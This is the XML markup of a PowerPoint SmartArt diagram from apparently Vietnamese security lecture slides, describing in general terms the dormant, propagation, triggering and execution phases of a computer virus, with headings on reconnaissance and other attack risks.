              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thái</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>chờ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>để</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> được kích hoạt bởi một số sự kiện. Không phải tất cả các virus đều có giai đoạn này.</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="31656" y="23866"/>
        <a:ext cx="7431952" cy="1017508"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{910CD3DB-4F6C-4B0E-8CAC-D635A55B73BA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="727751" y="1174766"/>
          <a:ext cx="8689571" cy="1270375"/>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latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Propagation (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>lan</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>truyền</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="171450" lvl="1" indent="-171450" algn="just" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đặt một bản sao</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>của chính nó vào các chương trình</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khác</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> hoặc một số khu vực hệ thống trên đĩa. Mỗi chương trình bị nhiễm sẽ chứa một bản sao của virus</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>và</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiếp</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>vào</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>giai</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đoạn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>lan</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>truyền</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="764959" y="1211974"/>
        <a:ext cx="7184870" cy="1195959"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{AC40530A-4DAC-4B43-A76F-B619E1585E6B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1254426" y="2492533"/>
          <a:ext cx="9070000" cy="1189508"/>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latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Triggering (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>kích</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hoạt</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="171450" lvl="1" indent="-171450" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Virus </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>được kích hoạt để thực hiện chức năng mà nó đã được dự định. Giống như giai đoạn ngủ đông, giai đoạn khởi động có thể do nhiều sự kiện của hệ thống, bao gồm cả số lần mà bản sao của virut này đã sao chép chính nó</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1289265" y="2527372"/>
        <a:ext cx="7518757" cy="1119830"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{DF1DFB29-F9A9-4965-8E12-3300498E3117}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="2172392" y="3700041"/>
          <a:ext cx="8689571" cy="1111980"/>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latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Execution (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thực</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hiện</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="171450" lvl="1" indent="-171450" algn="l" defTabSz="800100">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Chức năng được thực hiện, có thể vô </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hại</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thông báo trên màn hình</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>…) </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hoặc gây hư hỏng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>sự phá hủy các chương trình và các tập tin dữ liệu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>…)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" i="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="2204961" y="3732610"/>
        <a:ext cx="7194148" cy="1046842"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{477128D5-EEBD-4345-88F6-D00FF99E1DA9}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="7987037" y="820020"/>
          <a:ext cx="702533" cy="702533"/>
        </a:xfrm>
        <a:prstGeom prst="downArrow">
          <a:avLst>
            <a:gd name="adj1" fmla="val 55000"/>
            <a:gd name="adj2" fmla="val 45000"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="lt1">
            <a:alpha val="90000"/>
            <a:tint val="40000"/>
            <a:hueOff val="0"/>
            <a:satOff val="0"/>
            <a:lumOff val="0"/>
            <a:alphaOff val="0"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent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1466850">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:endParaRPr lang="vi-VN" sz="3300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="8145107" y="820020"/>
        <a:ext cx="386393" cy="528656"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C543869D-70F6-4EF6-926F-69A54F2503F1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="8714789" y="2097354"/>
          <a:ext cx="702533" cy="702533"/>
        </a:xfrm>
        <a:prstGeom prst="downArrow">
          <a:avLst>
            <a:gd name="adj1" fmla="val 55000"/>
            <a:gd name="adj2" fmla="val 45000"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="lt1">
            <a:alpha val="90000"/>
            <a:tint val="40000"/>
            <a:hueOff val="0"/>
            <a:satOff val="0"/>
            <a:lumOff val="0"/>
            <a:alphaOff val="0"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent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1466850">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:endParaRPr lang="vi-VN" sz="3300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="8872859" y="2097354"/>
        <a:ext cx="386393" cy="528656"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{E2024A96-81D4-4B42-8F9A-E8788F0E2983}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="9431678" y="3374687"/>
          <a:ext cx="702533" cy="702533"/>
        </a:xfrm>
        <a:prstGeom prst="downArrow">
          <a:avLst>
            <a:gd name="adj1" fmla="val 55000"/>
            <a:gd name="adj2" fmla="val 45000"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="lt1">
            <a:alpha val="90000"/>
            <a:tint val="40000"/>
            <a:hueOff val="0"/>
            <a:satOff val="0"/>
            <a:lumOff val="0"/>
            <a:alphaOff val="0"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent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1466850">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:endParaRPr lang="vi-VN" sz="3300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="9589748" y="3374687"/>
        <a:ext cx="386393" cy="52865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76A578-B55C-43EC-B2A0-551426FD04BF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2024487"/>
          <a:ext cx="10860157" cy="1638000"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:alpha val="90000"/>
            <a:tint val="4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E841021-028B-435A-A662-9D12B985022C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="543007" y="1065087"/>
          <a:ext cx="7313229" cy="1918800"/>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7342" tIns="0" rIns="287342" bIns="0" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1555750">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1" kern="1200"/>
            <a:t>1. Nguy cơ tấn công do thám</a:t>
          </a:r>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="636675" y="1158755"/>
        <a:ext cx="7125893" cy="173146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76A578-B55C-43EC-B2A0-551426FD04BF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2024487"/>
          <a:ext cx="10860157" cy="1638000"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:alpha val="90000"/>
            <a:tint val="4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E841021-028B-435A-A662-9D12B985022C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="543007" y="1065087"/>
          <a:ext cx="7313229" cy="1918800"/>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7342" tIns="0" rIns="287342" bIns="0" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1555750">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="3500" b="1" kern="1200"/>
            <a:t>2. Nguy cơ tấn công </a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1555750">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
